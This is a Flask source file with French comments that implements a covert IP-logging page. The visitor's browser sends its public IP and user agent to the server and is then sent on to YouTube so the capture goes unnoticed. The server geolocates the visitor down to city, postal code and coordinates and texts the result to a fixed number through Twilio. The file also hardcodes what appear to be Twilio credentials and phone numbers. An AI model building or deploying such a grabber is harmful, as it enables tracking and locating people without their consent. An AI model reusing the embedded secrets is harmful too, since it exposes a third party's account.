from flask import Flask, request, redirect, jsonify
from twilio.rest import Client
import os
import requests

app = Flask(__name__)

# Twilio config (remplace avec tes vraies infos)
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_number = '+12524866318'
to_number = '+33635960569'
client = Client(account_sid, auth_token)

# Fonction pour géolocaliser l'IP
def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data["status"] == "success":
            return {
                "ip": ip,
                "country": data.get("country"),
                "region": data.get("regionName"),
                "city": data.get("city"),
                "zip": data.get("zip"),
                "lat": data.get("lat"),
                "lon": data.get("lon"),
                "isp": data.get("isp")
            }
    except Exception as e:
        print(f"[!] Erreur géolocalisation : {e}")
    return {}

# Envoi SMS enrichi
def send_sms(info, user_agent):
    message_body = f"""Nouvelle IP capturée :
IP : {info.get('ip')}
Pays : {info.get('country')}
Ville : {info.get('city')}
Région : {info.get('region')}
Code postal : {info.get('zip')}
Latitude : {info.get('lat')}
Longitude : {info.get('lon')}
FAI : {info.get('isp')}
User-Agent : {user_agent}
"""
    try:
        client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )
        print("[+] SMS envoyé")
    except Exception as e:
        print(f"[!] Erreur envoi SMS : {e}")

    # Log dans un fichier
    try:
        with open("logs.txt", "a") as f:
            f.write(message_body + "\n---\n")
    except Exception as e:
        print(f"[!] Erreur enregistrement fichier : {e}")

@app.route('/')
def index():
    return '''
    <html>
    <head><title>Redirection</title></head>
    <body>
        <script>
            fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                fetch("/log", {
                    method: "POST",
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: data.ip,
                        ua: navigator.userAgent
                    })
                }).then(() => {
                    window.location.href = "https://www.youtube.com";
                });
            });
        </script>
    </body>
    </html>
    '''

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    ip = data.get('ip')
    user_agent = data.get('ua')
    print(f"[+] IP reçue : {ip}")
    info = get_ip_info(ip)
    send_sms(info, user_agent)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
